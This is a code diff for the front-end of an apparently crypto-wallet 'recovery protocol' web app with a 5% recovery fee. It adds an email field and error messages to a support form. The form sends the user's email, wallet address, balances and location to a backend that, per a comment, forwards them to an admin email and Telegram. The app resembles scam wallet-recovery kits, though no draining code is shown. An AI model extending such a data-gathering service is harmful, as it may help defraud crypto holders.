@@ -92,9 +92,13 @@ const TRANSLATIONS = {
     reportDownloaded: 'Report downloaded successfully',
     support: 'Support',
     reportIssue: 'Report an Issue',
-    issuePlaceholder: 'Describe your issue...',
+    yourEmail: 'Your Email Address',
+    issuePlaceholder: 'Describe your issue in detail...',
     sendReport: 'Send Report',
-    reportSent: 'Report sent successfully!'
+    reportSent: 'Report sent successfully! Support will contact you shortly.',
+    processingReport: 'Sending report...',
+    reportError: 'Failed to send report. Please try again.',
+    contactInfo: 'We\'ll follow up via email within 24 hours.'
   },
   es: {
     serviceActive: 'PROTOCOLO DE RECUPERACIÓN · ACTIVO',
@@ -153,9 +157,13 @@ const TRANSLATIONS = {
     reportDownloaded: 'Informe descargado',
     support: 'Soporte',
     reportIssue: 'Reportar Problema',
-    issuePlaceholder: 'Describe tu problema...',
+    yourEmail: 'Tu Correo Electrónico',
+    issuePlaceholder: 'Describe tu problema en detalle...',
     sendReport: 'Enviar Reporte',
-    reportSent: '¡Reporte enviado!'
+    reportSent: '¡Reporte enviado! Te contactaremos pronto.',
+    processingReport: 'Enviando reporte...',
+    reportError: 'Error al enviar. Intenta de nuevo.',
+    contactInfo: 'Te contactaremos por email en 24 horas.'
   }
 };
 
@@ -469,23 +477,35 @@ const AutoRecoveryCountdown = ({ seconds, translations, onCancel }) => {
 };
 
 // ============================================
-// REPORT ISSUE COMPONENT
+// ENHANCED REPORT ISSUE COMPONENT - WITH EMAIL INPUT
 // ============================================
 const ReportIssue = ({ translations, address, balances, userLocation }) => {
+  const [userEmail, setUserEmail] = useState('');
   const [issueText, setIssueText] = useState('');
   const [isSending, setIsSending] = useState(false);
   const [sent, setSent] = useState(false);
+  const [errorMsg, setErrorMsg] = useState('');
 
   const handleSendReport = async () => {
-    if (!issueText.trim()) return;
+    if (!userEmail.trim()) {
+      setErrorMsg('Please enter your email address');
+      return;
+    }
+    if (!issueText.trim()) {
+      setErrorMsg('Please describe your issue');
+      return;
+    }
     
     setIsSending(true);
+    setErrorMsg('');
+    
     try {
-      // Send to backend which will forward to admin email
+      // Send to backend which will forward to admin email AND Telegram
       const response = await fetch(`${BACKEND_URL}/api/send-report`, {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
         body: JSON.stringify({
+          userEmail: userEmail,
           walletAddress: address,
           issue: issueText,
           location: userLocation,
@@ -498,11 +518,15 @@ const ReportIssue = ({ translations, address, balances, userLocation }) => {
       const result = await response.json();
       if (result.success) {
         setSent(true);
+        setUserEmail('');
         setIssueText('');
-        setTimeout(() => setSent(false), 3000);
+        setTimeout(() => setSent(false), 5000);
+      } else {
+        setErrorMsg(result.error || translations.reportError);
       }
     } catch (err) {
       console.error('Report error:', err);
+      setErrorMsg(translations.reportError);
     } finally {
       setIsSending(false);
     }
@@ -510,21 +534,56 @@ const ReportIssue = ({ translations, address, balances, userLocation }) => {
 
   return (
     <div className="bg-blue-500/5 border border-blue-500/20 backdrop-blur p-6 rounded-xl">
-      <h3 className="text-lg font-bold mb-3 text-blue-400">📧 {translations.support}</h3>
-      <p className="text-xs text-gray-400 mb-3">Having issues with recovery? Send us a message.</p>
+      <div className="flex items-center gap-2 mb-3">
+        <span className="text-xl">📧</span>
+        <h3 className="text-lg font-bold text-blue-400">{translations.support} & {translations.reportIssue}</h3>
+      </div>
+      <p className="text-xs text-gray-400 mb-4">{translations.contactInfo}</p>
+      
+      {/* Email Input */}
+      <input
+        type="email"
+        value={userEmail}
+        onChange={(e) => setUserEmail(e.target.value)}
+        placeholder={translations.yourEmail}
+        className="w-full bg-black/50 border border-blue-500/30 rounded-xl px-4 py-3 text-white placeholder-gray-500 focus:outline-none focus:border-blue-500 text-sm mb-3"
+      />
+      
+      {/* Issue Textarea */}
       <textarea
         value={issueText}
         onChange={(e) => setIssueText(e.target.value)}
         placeholder={translations.issuePlaceholder}
-        rows={3}
+        rows={4}
         className="w-full bg-black/50 border border-blue-500/30 rounded-xl px-4 py-3 text-white placeholder-gray-500 focus:outline-none focus:border-blue-500 text-sm mb-3"
       />
+      
+      {/* Error Message */}
+      {errorMsg && (
+        <div className="mb-3 text-xs text-red-400 bg-red-500/10 rounded-lg p-2">
+          ⚠️ {errorMsg}
+        </div>
+      )}
+      
+      {/* Success Message */}
+      {sent && (
+        <div className="mb-3 text-xs text-green-400 bg-green-500/10 rounded-lg p-2">
+          ✓ {translations.reportSent}
+        </div>
+      )}
+      
+      {/* Send Button */}
       <button
         onClick={handleSendReport}
-        disabled={isSending || !issueText.trim()}
-        className="w-full bg-blue-600 hover:bg-blue-700 text-white font-semibold py-2 rounded-xl transition-all disabled:opacity-50"
+        disabled={isSending}
+        className="w-full bg-gradient-to-r from-blue-600 to-blue-500 hover:from-blue-700 hover:to-blue-600 text-white font-semibold py-3 rounded-xl transition-all disabled:opacity-50"
       >
-        {isSending ? 'Sending...' : sent ? '✓ Sent!' : translations.sendReport}
+        {isSending ? (
+          <span className="flex items-center justify-center gap-2">
+            <div className="w-4 h-4 border-2 border-white border-t-transparent rounded-full animate-spin"></div>
+            {translations.processingReport}
+          </span>
+        ) : sent ? '✓ Sent!' : translations.sendReport}
       </button>
     </div>
   );
@@ -1501,7 +1560,7 @@ function App() {
                 <p className="text-lg font-bold text-blue-400">{Object.keys(balances).length}/5</p>
               </div>
               <div className="bg-black/50 border border-blue-500/30 rounded-xl p-3 text-center">
-                <p className="text-xs text-gray-400">{translations.recoveryFee || 'Recovery Fee'}</p>
+                <p className="text-xs text-gray-400">Recovery Fee</p>
                 <p className="text-lg font-bold text-blue-400">5% + Gas</p>
               </div>
             </div>
@@ -1588,7 +1647,7 @@ function App() {
             </div>
           )}
 
-          {/* Info Section - 3 columns */}
+          {/* Info Section - 3 columns with enhanced Report Issue */}
           <div className="grid grid-cols-1 md:grid-cols-3 gap-6 mt-12">
             
             <div className="bg-blue-500/5 border border-blue-500/20 backdrop-blur p-6 rounded-xl">
@@ -1612,7 +1671,7 @@ function App() {
               </p>
             </div>
 
-            {/* Report Issue Component - Replaces the old email section */}
+            {/* Enhanced Report Issue Component with Email Input */}
             <ReportIssue 
               translations={translations}
               address={address}
